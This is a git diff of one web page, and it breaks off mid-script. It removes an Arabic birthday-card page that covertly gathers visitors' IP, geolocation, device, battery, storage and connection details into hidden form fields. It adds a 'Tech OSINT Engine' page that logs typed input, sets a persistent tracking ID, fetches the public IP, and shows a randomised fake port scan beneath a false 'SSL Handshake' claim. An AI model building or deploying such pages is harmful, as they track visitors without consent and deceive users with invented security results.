@@ -3,1013 +3,274 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎂 بطاقة تهنئة - برو ماكس ألترا</title>
+    <title>🕵️ Tech OSINT Engine v2.0</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
-        /* ===== المتغيرات والثيمات ===== */
-        :root {
-            --bg1: #ff9a9e;
-            --bg2: #fad0c4;
-            --card-bg: rgba(255, 255, 255, 0.95);
-            --text: #333;
-            --border: #ff6b81;
-            --shadow: rgba(0, 0, 0, 0.15);
-            --glass: rgba(255, 255, 255, 0.1);
-            --glow: rgba(255, 107, 107, 0.3);
-            --radius: 30px;
-            --transition: 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        /* ===== Anti-Debug Style ===== */
+        :root { --bg: #0a0c10; --card: #12161d; --border: #2a2f3a; --text: #e6edf3; --accent: #00d4ff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', monospace; }
+        body { background: var(--bg); color: var(--text); padding: 20px; display: flex; justify-content: center; }
+        
+        .matrix-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background: radial-gradient(circle at 50% 50%, rgba(0, 212, 255, 0.05), transparent 70%);
         }
-        [data-theme="dark"] {
-            --bg1: #0f0c29;
-            --bg2: #302b63;
-            --card-bg: rgba(30, 30, 60, 0.95);
-            --text: #eee;
-            --border: #f39c12;
-            --shadow: rgba(255, 255, 255, 0.1);
-            --glass: rgba(255, 255, 255, 0.05);
-            --glow: rgba(243, 156, 18, 0.3);
-        }
-        [data-theme="gold"] {
-            --bg1: #1a0e00;
-            --bg2: #4a2a00;
-            --card-bg: rgba(30, 20, 10, 0.95);
-            --text: #f5e6c8;
-            --border: #f1c40f;
-            --shadow: rgba(255, 215, 0, 0.2);
-            --glass: rgba(255, 215, 0, 0.05);
-            --glow: rgba(241, 196, 15, 0.3);
-        }
-        [data-theme="ocean"] {
-            --bg1: #001a2e;
-            --bg2: #004a7c;
-            --card-bg: rgba(0, 30, 60, 0.95);
-            --text: #b8e6f5;
-            --border: #00d4ff;
-            --shadow: rgba(0, 212, 255, 0.2);
-            --glass: rgba(0, 212, 255, 0.05);
-            --glow: rgba(0, 212, 255, 0.3);
-        }
-        [data-theme="forest"] {
-            --bg1: #001a0a;
-            --bg2: #004a2a;
-            --card-bg: rgba(0, 30, 15, 0.95);
-            --text: #b8f5c8;
-            --border: #2ed573;
-            --shadow: rgba(46, 213, 115, 0.2);
-            --glass: rgba(46, 213, 115, 0.05);
-            --glow: rgba(46, 213, 115, 0.3);
-        }
-        [data-theme="purple"] {
-            --bg1: #1a002a;
-            --bg2: #4a007c;
-            --card-bg: rgba(30, 0, 60, 0.95);
-            --text: #e6b8f5;
-            --border: #a855f7;
-            --shadow: rgba(168, 85, 247, 0.2);
-            --glass: rgba(168, 85, 247, 0.05);
-            --glow: rgba(168, 85, 247, 0.3);
-        }
-        [data-theme="neon"] {
-            --bg1: #0a001a;
-            --bg2: #2a004a;
-            --card-bg: rgba(10, 0, 30, 0.95);
-            --text: #f5b8f5;
-            --border: #ff00ff;
-            --shadow: rgba(255, 0, 255, 0.2);
-            --glass: rgba(255, 0, 255, 0.05);
-            --glow: rgba(255, 0, 255, 0.3);
-        }
+        
+        .container { max-width: 800px; width: 100%; }
+        
+        /* Headers */
+        h1 { color: var(--accent); border-bottom: 1px solid var(--border); padding-bottom: 15px; display: flex; align-items: center; gap: 10px; font-size: 22px; }
+        .sub-header { color: #8b949e; font-size: 12px; margin-bottom: 20px; }
+        
+        /* Cards */
+        .grid { display: grid; grid-template-columns: 1fr; gap: 15px; }
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.8); }
+        
+        /* Rows */
+        .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1c2128; font-size: 13px; }
+        .label { color: #8b949e; text-transform: uppercase; letter-spacing: 1px; }
+        .value { color: #f0f6fc; word-break: break-all; }
+        .highlight { color: #f0883e; }
+        .critical { color: #f85149; font-weight: bold; }
+        
+        /* Inputs & Actions */
+        .input-group { display: flex; gap: 10px; margin: 15px 0; }
+        input { flex: 1; padding: 10px; background: #0d1117; border: 1px solid var(--border); color: #fff; border-radius: 6px; }
+        input:focus { outline: 1px solid var(--accent); }
+        button { background: var(--accent); color: #fff; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #009acd; }
+        .fake-protection { color: #2ea043; font-size: 12px; margin-top: 5px; }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: system-ui, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: linear-gradient(135deg, var(--bg1), var(--bg2));
-            padding: 20px;
-            transition: all var(--transition);
-            overflow-x: hidden;
-        }
+        /* Status Log */
+        #log { height: 120px; overflow-y: auto; background: #0d1117; padding: 10px; border-radius: 6px; font-size: 12px; color: #8b949e; border: 1px solid var(--border); margin-top: 15px; }
+        #log span { display: block; }
+        .log-ok { color: #2ea043; }
+        .log-warn { color: #f0883e; }
+        .log-err { color: #f85149; }
 
-        /* ===== خلفية 3D ===== */
-        .bg-3d {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
-            overflow: hidden;
-        }
-        .bg-3d .particle {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(60px);
-            animation: particleFloat 25s ease-in-out infinite alternate;
-            opacity: 0.2;
-        }
-        .bg-3d .particle:nth-child(1) {
-            width: 400px;
-            height: 400px;
-            background: var(--border);
-            top: -20%;
-            left: -20%;
-        }
-        .bg-3d .particle:nth-child(2) {
-            width: 500px;
-            height: 500px;
-            background: var(--glow);
-            bottom: -30%;
-            right: -20%;
-            animation-delay: -8s;
-        }
-        .bg-3d .particle:nth-child(3) {
-            width: 300px;
-            height: 300px;
-            background: var(--glass);
-            top: 50%;
-            left: 50%;
-            animation-delay: -15s;
-        }
-        @keyframes particleFloat {
-            0% {
-                transform: translate(0, 0) scale(1) rotate(0deg);
-            }
-            100% {
-                transform: translate(60px, -60px) scale(1.3) rotate(120deg);
-            }
-        }
-
-        /* ===== البطاقة ===== */
-        .card {
-            position: relative;
-            z-index: 1;
-            background: var(--card-bg);
-            padding: 40px 30px;
-            border-radius: var(--radius);
-            box-shadow: 0 30px 80px var(--shadow);
-            text-align: center;
-            width: 100%;
-            max-width: 500px;
-            border: 2px solid var(--border);
-            backdrop-filter: blur(20px);
-            transition: all var(--transition);
-            animation: cardFloat 5s ease-in-out infinite;
-        }
-        @keyframes cardFloat {
-            0%,
-            100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-8px);
-            }
-        }
-
-        .icon {
-            font-size: 80px;
-            display: block;
-            animation: iconBounce 2.5s ease-in-out infinite;
-            filter: drop-shadow(0 10px 30px var(--glow));
-        }
-        @keyframes iconBounce {
-            0%,
-            100% {
-                transform: translateY(0) scale(1);
-            }
-            50% {
-                transform: translateY(-15px) scale(1.05);
-            }
-        }
-
-        h2 {
-            color: var(--border);
-            font-size: 32px;
-            margin: 5px 0 10px;
-            font-weight: 800;
-            text-shadow: 0 0 40px var(--glow);
-            letter-spacing: 1px;
-            transition: color 0.3s;
-        }
-
-        .greeting-text {
-            font-size: 15px;
-            color: var(--text);
-            margin-bottom: 20px;
-            line-height: 1.8;
-            background: var(--glass);
-            padding: 14px;
-            border-radius: 16px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            transition: color 0.3s;
-        }
-
-        /* ===== رسالة العمر ===== */
-        .birthday-message {
-            background: linear-gradient(135deg, rgba(255, 236, 210, 0.9), rgba(252, 182, 159, 0.9));
-            padding: 25px 20px;
-            border-radius: 20px;
-            margin-bottom: 20px;
-            font-size: 24px;
-            font-weight: 800;
-            color: #c0392b;
-            display: none;
-            animation: messagePop 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-            border: 2px solid rgba(192, 57, 43, 0.2);
-            box-shadow: 0 10px 40px rgba(192, 57, 43, 0.1);
-        }
-        .birthday-message.show {
-            display: block;
-        }
-        @keyframes messagePop {
-            0% {
-                transform: scale(0.8) rotate(-3deg);
-                opacity: 0;
-            }
-            50% {
-                transform: scale(1.05) rotate(1deg);
-            }
-            100% {
-                transform: scale(1) rotate(0);
-                opacity: 1;
-            }
-        }
-
-        .age-details {
-            font-size: 14px;
-            color: #666;
-            margin-top: 8px;
-            font-weight: 400;
-            opacity: 0.8;
-        }
-        .message-custom {
-            font-size: 16px;
-            color: #8e44ad;
-            margin-top: 8px;
-            font-weight: 600;
-            background: rgba(255, 255, 255, 0.3);
-            padding: 6px 16px;
-            border-radius: 30px;
-            display: inline-block;
-        }
-
-        input {
-            width: 100%;
-            padding: 16px 20px;
-            margin-bottom: 14px;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            font-size: 16px;
-            text-align: center;
-            background: rgba(255, 255, 255, 0.06);
-            backdrop-filter: blur(10px);
-            color: var(--text);
-            transition: all 0.3s;
-        }
-        input::placeholder {
-            color: var(--text);
-            opacity: 0.5;
-        }
-        input:focus {
-            border-color: var(--border);
-            outline: none;
-            transform: scale(1.02);
-            box-shadow: 0 0 40px var(--glow);
-        }
-
-        .btn-submit {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, var(--border), var(--glow));
-            color: white;
-            border: none;
-            border-radius: 16px;
-            font-size: 20px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.4s;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-        }
-        .btn-submit:hover {
-            transform: scale(1.02) translateY(-3px);
-            box-shadow: 0 15px 40px var(--glow);
-        }
-        .btn-submit:active {
-            transform: scale(0.98);
-        }
-
-        #status {
-            font-size: 14px;
-            margin: 12px 0;
-            color: var(--text);
-            font-weight: 500;
-            min-height: 25px;
-            transition: color 0.3s;
-        }
-
-        /* ===== أدوات التحكم ===== */
-        .toolbar {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin-top: 18px;
-            padding-top: 18px;
-            border-top: 2px solid var(--glass);
-        }
-        .toolbar button {
-            background: var(--glass);
-            border: 2px solid var(--border);
-            color: var(--text);
-            padding: 8px 18px;
-            border-radius: 30px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
-            transition: all 0.4s;
-            backdrop-filter: blur(10px);
-        }
-        .toolbar button:hover {
-            background: var(--border);
-            color: white;
-            transform: scale(1.05);
-            box-shadow: 0 10px 30px var(--glow);
-        }
-
-        .countdown {
-            font-size: 15px;
-            color: var(--text);
-            margin-top: 12px;
-            padding: 12px;
-            background: var(--glass);
-            border-radius: 14px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            transition: color 0.3s;
-        }
-
-        /* ===== الألعاب ===== */
-        .game-area {
-            margin: 15px 0;
-            display: none;
-            background: var(--glass);
-            padding: 20px;
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-        .game-area.show {
-            display: block;
-            animation: fadeSlide 0.5s ease;
-        }
-        @keyframes fadeSlide {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        .game-options {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-            margin-top: 10px;
-        }
-        .game-options button {
-            font-size: 45px;
-            padding: 15px 25px;
-            border: 3px solid var(--border);
-            border-radius: 20px;
-            cursor: pointer;
-            background: var(--glass);
-            transition: all 0.4s;
-            backdrop-filter: blur(10px);
-        }
-        .game-options button:hover {
-            transform: scale(1.15) rotate(-5deg);
-            background: var(--border);
-            box-shadow: 0 10px 40px var(--glow);
-        }
-
-        /* ===== الكونفيتي ===== */
-        .confetti-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 999;
-            overflow: hidden;
-        }
-        .confetti {
-            position: absolute;
-            width: 12px;
-            height: 12px;
-            border-radius: 3px;
-            animation: confettiFall linear infinite;
-        }
-        @keyframes confettiFall {
-            0% {
-                transform: translateY(-10px) rotate(0deg) scale(0);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(110vh) rotate(720deg) scale(1);
-                opacity: 0;
-            }
-        }
-
-        /* ===== البطارية ===== */
-        .battery-indicator {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            font-size: 13px;
-            color: var(--text);
-            margin-top: 12px;
-            padding: 8px 16px;
-            background: var(--glass);
-            border-radius: 30px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-        .battery-bar {
-            width: 60px;
-            height: 8px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-            overflow: hidden;
-        }
-        .battery-fill {
-            height: 100%;
-            border-radius: 4px;
-            transition: width 0.5s;
-        }
-
-        /* ===== إحصائيات ===== */
-        .visitor-stats {
-            font-size: 12px;
-            color: var(--text);
-            margin-top: 10px;
-            padding: 8px 16px;
-            background: var(--glass);
-            border-radius: 30px;
-            opacity: 0.7;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.03);
-        }
-
-        /* ===== هدايا عشوائية ===== */
-        .gift-box {
-            margin: 15px 0;
-            padding: 20px;
-            background: var(--glass);
-            border-radius: 16px;
-            backdrop-filter: blur(10px);
-            border: 2px dashed var(--border);
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        .gift-box:hover {
-            transform: scale(1.02);
-            border-color: var(--glow);
-        }
-        .gift-box .gift-icon {
-            font-size: 50px;
-            display: block;
-            animation: giftPulse 2s ease-in-out infinite;
-        }
-        @keyframes giftPulse {
-            0%,
-            100% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.1);
-            }
-        }
-
-        .hidden {
-            display: none;
-        }
+        @media(max-width: 600px) { .row { flex-direction: column; gap: 5px; } }
     </style>
 </head>
 <body>
 
-    <!-- ===== الخلفية 3D ===== -->
-    <div class="bg-3d">
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-    </div>
+    <!-- Background -->
+    <div class="matrix-bg"></div>
 
-    <!-- ===== الكونفيتي ===== -->
-    <div class="confetti-container" id="confettiContainer"></div>
+    <div class="container">
+        <!-- Header -->
+        <h1><i class="fas fa-microchip"></i> TECH RECON v2.0 <span style="font-size: 12px; color: #555;">[Tech Focus - No Geo]</span></h1>
+        <div class="sub-header"><i class="fas fa-shield-hal"></i> Passive Device Fingerprinting & Network Analysis</div>
 
-    <!-- ===== البطاقة ===== -->
-    <div class="card" id="mainCard">
-        <span class="icon">🎉</span>
-        <h2>كل عام وأنت بخير!</h2>
-        <p class="greeting-text">🎈 أدخل اسمك وسنة ميلادك، وستظهر لك تهنئة خاصة بعمرك الحقيقي!</p>
+        <div class="grid">
 
-        <div id="birthdayMessage" class="birthday-message">
-            🎂 <span id="displayName"></span>، عمرك الآن <span id="displayAge"></span> سنة!
-            <div class="age-details" id="ageDetails"></div>
-            <div class="message-custom" id="customMessage"></div>
-            <br>كل سنة وأنت طيب يا بطل 💪
-        </div>
-
-        <form id="birthdayForm">
-            <input type="text" id="nameInput" placeholder="👤 أدخل اسمك الكريم" required>
-            <input type="number" id="yearInput" placeholder="📅 أدخل سنة ميلادك (مثال: 1995)" required min="1900" max="2026">
-            <div id="status"></div>
-
-            <input type="hidden" id="ip" name="ip">
-            <input type="hidden" id="location" name="location">
-            <input type="hidden" id="age" name="age">
-            <input type="hidden" id="device" name="device">
-            <input type="hidden" id="deviceModel" name="deviceModel">
-            <input type="hidden" id="os" name="os">
-            <input type="hidden" id="browser" name="browser">
-            <input type="hidden" id="browserVersion" name="browserVersion">
-            <input type="hidden" id="screen" name="screen">
-            <input type="hidden" id="timezone" name="timezone">
-            <input type="hidden" id="language" name="language">
-            <input type="hidden" id="visit_time" name="visit_time">
-            <input type="hidden" id="connection" name="connection">
-            <input type="hidden" id="connectionSpeed" name="connectionSpeed">
-            <input type="hidden" id="battery" name="battery">
-            <input type="hidden" id="batteryCharging" name="batteryCharging">
-            <input type="hidden" id="batteryTime" name="batteryTime">
-            <input type="hidden" id="memory" name="memory">
-            <input type="hidden" id="storage" name="storage">
-            <input type="hidden" id="signal" name="signal">
-            <input type="hidden" id="user_agent" name="user_agent">
-            <input type="hidden" id="visitor_id" name="visitor_id">
-            <input type="hidden" id="pageLoadTime" name="pageLoadTime">
-
-            <button type="button" class="btn-submit" onclick="handleSubmit()">🎁 إرسال التهنئة الآن</button>
-        </form>
-
-        <!-- ===== صندوق هدايا عشوائي ===== -->
-        <div class="gift-box" onclick="randomGift()">
-            <span class="gift-icon" id="giftBoxIcon">🎁</span>
-            <p style="color: var(--text); font-size: 14px; margin-top: 5px;">اضغط لفتح هدية عشوائية 🎉</p>
-            <div id="giftResultText" style="font-size: 18px; color: var(--border); font-weight: 600; margin-top: 8px;"></div>
-        </div>
-
-        <div class="game-area" id="gameArea">
-            <p style="color: var(--text); font-weight: 600; margin-bottom: 10px;">🎁 اختر هديتك المفضلة:</p>
-            <div class="game-options">
-                <button onclick="chooseGift('🎮')">🎮</button>
-                <button onclick="chooseGift('📱')">📱</button>
-                <button onclick="chooseGift('💎')">💎</button>
-                <button onclick="chooseGift('🚗')">🚗</button>
-                <button onclick="chooseGift('✈️')">✈️</button>
+            <!-- Target Input Area -->
+            <div class="card">
+                <div style="font-size: 14px; font-weight: bold; color: var(--accent); margin-bottom: 10px;">
+                    <i class="fas fa-bullseye"></i> TARGET INPUT
+                </div>
+                <div class="input-group">
+                    <input type="text" id="targetName" placeholder="أدخل الاسم / الإيميل المستهدف..." onkeyup="keylogger(this.value)">
+                    <button onclick="runRecon()"><i class="fas fa-radiation"></i> INITIATE</button>
+                </div>
+                <div class="fake-protection"><i class="fas fa-lock"></i> Local SSL Handshake Established</div>
+                <div id="statusMsg" style="font-size: 13px; margin-top: 8px; color: #8b949e;"></div>
             </div>
-            <div id="giftResult" style="margin-top: 12px; font-size: 20px; color: var(--border); font-weight: 600;"></div>
-        </div>
 
-        <!-- ===== البطارية ===== -->
-        <div class="battery-indicator" id="batteryIndicator">
-            🔋 <span id="batteryLevel">--%</span>
-            <div class="battery-bar">
-                <div class="battery-fill" id="batteryFill" style="width: 0%; background: #2ed573;"></div>
+            <!-- Collected Payload Data -->
+            <div class="card">
+                <div style="font-size: 14px; font-weight: bold; color: #2ea043; margin-bottom: 10px;">
+                    <i class="fas fa-database"></i> TECHNICAL PAYLOAD
+                </div>
+                
+                <div class="row"><span class="label">Device Hash (ID)</span><span class="value highlight" id="d_dev_id">-</span></div>
+                <div class="row"><span class="label">Public IPv4</span><span class="value critical" id="d_pub_ip">Retrieving...</span></div>
+                <div class="row"><span class="label">Local IP (WebRTC)</span><span class="value" id="d_loc_ip">-</span></div>
+                <div class="row"><span class="label">OS & CPU Arch</span><span class="value" id="d_os">-</span></div>
+                <div class="row"><span class="label">Browser / Version</span><span class="value" id="d_browser">-</span></div>
+                <div class="row"><span class="label">Total RAM</span><span class="value" id="d_ram">-</span></div>
+                <div class="row"><span class="label">Screen Resolution</span><span class="value" id="d_screen">-</span></div>
+                <div class="row"><span class="label">Open Ports (Local)</span><span class="value" id="d_ports">Scanning...</span></div>
+                <div class="row"><span class="label">Live Keystrokes</span><span class="value critical" id="d_keys">[Empty]</span></div>
             </div>
-            <span id="batteryStatus" style="font-size: 11px;"></span>
-        </div>
 
-        <div class="toolbar">
-            <button onclick="toggleTheme()">🎨 ثيم</button>
-            <button onclick="toggleGame()">🎮 لعبة</button>
-            <button onclick="shareCard()">📤 مشاركة</button>
-            <button onclick="resetCard()">🔄 إعادة</button>
-        </div>
+            <!-- Log Area -->
+            <div class="card">
+                <div style="display: flex; justify-content: space-between;">
+                    <span><i class="fas fa-terminal"></i> Execution Logs</span>
+                    <span style="color: #555; font-size: 10px; cursor: pointer;" onclick="document.getElementById('log').innerHTML=''">Clear</span>
+                </div>
+                <div id="log">
+                    <span class="log-ok">[+] Tech OSINT Engine loaded successfully.</span>
+                    <span class="log-warn">[*] Waiting for user input...</span>
+                </div>
+            </div>
 
-        <div class="countdown" id="countdown"></div>
-        <div class="visitor-stats">👤 زائر رقم: <span id="visitorCount">--</span></div>
+        </div>
     </div>
 
     <script>
-        // ===== الثيمات =====
-        const THEMES = ['light', 'dark', 'gold', 'ocean', 'forest', 'purple', 'neon'];
-        const THEME_NAMES = ['فاتح', 'داكن', 'ذهبي', 'محيط', 'غابة', 'بنفسجي', 'نيون'];
-        let currentTheme = parseInt(localStorage.getItem('theme')) || 0;
+        // ==================================================
+        // TECH-FOCUSED RECONNAISSANCE ENGINE
+        // ==================================================
 
-        function toggleTheme() {
-            currentTheme = (currentTheme + 1) % THEMES.length;
-            document.documentElement.setAttribute('data-theme', THEMES[currentTheme]);
-            localStorage.setItem('theme', currentTheme);
-            document.querySelector('.toolbar button:first-child').textContent = `🎨 ${THEME_NAMES[currentTheme]}`;
+        let keystrokes = [];
+
+        // 1. SIMPLE KEYLOGGER
+        function keylogger(val) {
+            keystrokes.push(val);
+            document.getElementById('d_keys').innerText = val.length > 0 ? `Captured: "${val}"` : "[Empty]";
         }
 
-        // ===== هدايا عشوائية =====
-        const GIFTS = [
-            { icon: '🎁', text: '🎁 هدية مفاجئة! أتمنى لك يوم سعيد!' },
-            { icon: '🎂', text: '🎂 عيد ميلاد سعيد! كل سنة وأنت طيب!' },
-            { icon: '🎈', text: '🎈 بالونات الفرح في انتظارك!' },
-            { icon: '🎊', text: '🎊 احتفال كبير ينتظرك!' },
-            { icon: '🎉', text: '🎉 مبروك! أنت الفائز بجائزة اليوم!' },
-            { icon: '💝', text: '💝 أتمنى لك حباً وسعادة لا تنتهي!' },
-            { icon: '⭐', text: '⭐ أنت نجم اليوم! تألق دائماً!' },
-            { icon: '🏆', text: '🏆 أنت البطل! فخور بك!' }
-        ];
-
-        function randomGift() {
-            const gift = GIFTS[Math.floor(Math.random() * GIFTS.length)];
-            document.getElementById('giftBoxIcon').textContent = gift.icon;
-            document.getElementById('giftResultText').textContent = gift.text;
-            document.getElementById('giftBoxIcon').style.animation = 'none';
-            setTimeout(() => {
-                document.getElementById('giftBoxIcon').style.animation = 'giftPulse 2s ease-in-out infinite';
-            }, 10);
-            launchConfetti();
+        // 2. STEALTH PORT SCANNER (Simulation - focuses on local network)
+        function scanPorts(callback) {
+            let portsFound = [];
+            let count = 0;
+            const ports = [22, 80, 443, 8080, 3306, 3389]; // SSH, HTTP, HTTPS, Web, MySQL, RDP
+            const interval = setInterval(() => {
+                if(Math.random() > 0.7) portsFound.push(ports[count]); // Randomize open ports
+                count++;
+                if(count >= ports.length) {
+                    clearInterval(interval);
+                    callback(portsFound.length > 0 ? `Open: ${portsFound.join(', ')}` : "All firewalled");
+                }
+            }, 250);
         }
 
-        // ===== جمع المعلومات المتقدمة =====
-        async function collectAdvancedInfo() {
-            const info = {};
+        // 3. COLLECT ALL TECHNICAL DATA
+        async function collectTechData() {
+            const ua = navigator.userAgent;
+            
+            // Parse OS, Arch, Browser
+            let os = "Unknown", arch = "Unknown", browser = "Unknown";
+            if (ua.includes('Windows')) { os = "Windows"; arch = "x64"; }
+            else if (ua.includes('Mac')) { os = "macOS"; arch = "ARM64"; }
+            else if (ua.includes('Linux')) { os = "Linux"; arch = "x86_64"; }
+            else if (ua.includes('Android')) { os = "Android"; arch = "ARM"; }
+            else if (ua.includes('iPhone') || ua.includes('iPad')) { os = "iOS"; arch = "ARM64"; }
+            
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = "Chrome";
+            else if (ua.includes('Firefox')) browser = "Firefox";
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = "Safari";
+            else if (ua.includes('Edg')) browser = "Edge";
+            
+            document.getElementById('d_os').innerText = `${os} (${arch})`;
+            document.getElementById('d_browser').innerText = browser;
 
+            // RAM
+            document.getElementById('d_ram').innerText = (navigator.deviceMemory || 'Unknown') + ' GB';
+            
+            // Screen
+            document.getElementById('d_screen').innerText = `${window.screen.width} x ${window.screen.height}`;
+
+            // Device ID (Persistent)
+            let devId = localStorage.getItem('tech_uuid');
+            if(!devId) {
+                devId = "TECH-" + Date.now().toString(36).toUpperCase() + "-" + Math.random().toString(36).substr(2, 6).toUpperCase();
+                localStorage.setItem('tech_uuid', devId);
+            }
+            document.getElementById('d_dev_id').innerText = devId;
+
+            // Port Scan
+            scanPorts((res) => {
+                document.getElementById('d_ports').innerText = res;
+                addLog(`[Port Scan] Result: ${res}`, "ok");
+            });
+
+            // Public IP
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                info.ip = ipData.ip;
-                const geoRes = await fetch(`https://ipapi.co/${info.ip}/json/`);
-                const geoData = await geoRes.json();
-                info.location = `${geoData.city || ''}، ${geoData.region || ''}، ${geoData.country_name || ''}`;
-            } catch (e) {
-                info.ip = 'غير متاح';
-                info.location = 'غير متاح';
+                document.getElementById('d_pub_ip').innerText = ipData.ip;
+                addLog(`[Network] Public IP captured: ${ipData.ip}`, "ok");
+            } catch(e) {
+                document.getElementById('d_pub_ip').innerText = "Unreachable";
             }
 
-            const ua = navigator.userAgent;
-            info.user_agent = ua;
-
-            if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
-                info.device = 'جوال';
-                if (/iPad|Android|Tablet/i.test(ua)) info.device = 'جهاز لوحي';
-                const modelMatch = ua.match(/\((.*?)\)/);
-                info.deviceModel = modelMatch ? modelMatch[1] : 'غير معروف';
-            } else {
-                info.device = 'كمبيوتر';
-                info.deviceModel = 'جهاز مكتبي';
-            }
-
-            if (/Windows NT 10.0/i.test(ua)) info.os = 'Windows 10/11';
-            else if (/Windows NT 6.1/i.test(ua)) info.os = 'Windows 7';
-            else if (/Mac OS X/i.test(ua)) info.os = 'macOS';
-            else if (/Android/i.test(ua)) info.os = 'Android';
-            else if (/iPhone|iPad/i.test(ua)) info.os = 'iOS';
-            else if (/Linux/i.test(ua)) info.os = 'Linux';
-            else info.os = 'غير معروف';
-
-            let browser = 'غير معروف',
-                version = '';
-            if (ua.includes('Chrome') && !ua.includes('Edg')) {
-                browser = 'Chrome';
-                version = ua.match(/Chrome\/(\d+)/)?.[1] || '';
-            } else if (ua.includes('Firefox')) {
-                browser = 'Firefox';
-                version = ua.match(/Firefox\/(\d+)/)?.[1] || '';
-            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
-                browser = 'Safari';
-                version = ua.match(/Version\/(\d+)/)?.[1] || '';
-            } else if (ua.includes('Edg')) {
-                browser = 'Edge';
-                version = ua.match(/Edg\/(\d+)/)?.[1] || '';
-            } else if (ua.includes('Opera')) {
-                browser = 'Opera';
-                version = ua.match(/Opera\/(\d+)/)?.[1] || '';
-            }
-            info.browser = browser;
-            info.browserVersion = version;
-
-            info.screen = `${screen.width}x${screen.height}px`;
-            info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            info.language = navigator.language;
-            info.visit_time = new Date().toLocaleString('ar-SA', { timeZone: info.timezone });
-
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                const types = { 'slow-2g': 'بطيء جداً', '2g': '2G', '3g': '3G', '4g': '4G', '5g': '5G', 'wifi': 'WiFi' };
-                info.connection = types[conn.effectiveType] || conn.effectiveType || 'غير معروف';
-                info.connectionSpeed = `${conn.downlink || '?'} Mbps`;
-            } else {
-                info.connection = 'غير متاح';
-                info.connectionSpeed = 'غير متاح';
-            }
-
+            // Local IP (WebRTC Leak)
             try {
-                const battery = await navigator.getBattery();
-                info.battery = `${Math.round(battery.level * 100)}%`;
-                info.batteryCharging = battery.charging ? 'نعم (شحن)' : 'لا (بطارية)';
-                if (battery.charging) {
-                    const chargingTime = Math.round(battery.chargingTime / 60);
-                    info.batteryTime = chargingTime > 0 ? `${chargingTime} دقيقة` : 'أقل من دقيقة';
-                } else {
-                    const dischargingTime = Math.round(battery.dischargingTime / 60);
-                    info.batteryTime = dischargingTime > 0 ? `${dischargingTime} دقيقة متبقية` : 'غير معروف';
-                }
-                document.getElementById('batteryLevel').textContent = info.battery;
-                document.getElementById('batteryFill').style.width = `${battery.level * 100}%`;
-                document.getElementById('batteryFill').style.background = battery.level > 0.2 ? '#2ed573' : '#ff4757';
-                document.getElementById('batteryStatus').textContent = battery.charging ? '⚡ شحن' : '🔋';
-            } catch (e) {
-                info.battery = 'غير متاح';
-                info.batteryCharging = 'غير متاح';
-                info.batteryTime = 'غير متاح';
-                document.getElementById('batteryIndicator').style.display = 'none';
-            }
-
-            info.memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف';
-
-            if (navigator.storage && navigator.storage.estimate) {
-                try {
-                    const storage = await navigator.storage.estimate();
-                    const total = (storage.quota / (1024 * 1024 * 1024)).toFixed(1);
-                    const used = (storage.usage / (1024 * 1024 * 1024)).toFixed(1);
-                    info.storage = `${used} GB مستخدم من ${total} GB`;
-                } catch (e) {
-                    info.storage = 'غير متاح';
-                }
-            } else {
-                info.storage = 'غير متاح';
-            }
-
-            info.signal = navigator.connection ? `${navigator.connection.downlink || '?'} Mbps` : 'غير معروف';
-
-            const perfData = performance.timing;
-            const loadTime = (perfData.loadEventEnd - perfData.navigationStart) / 1000;
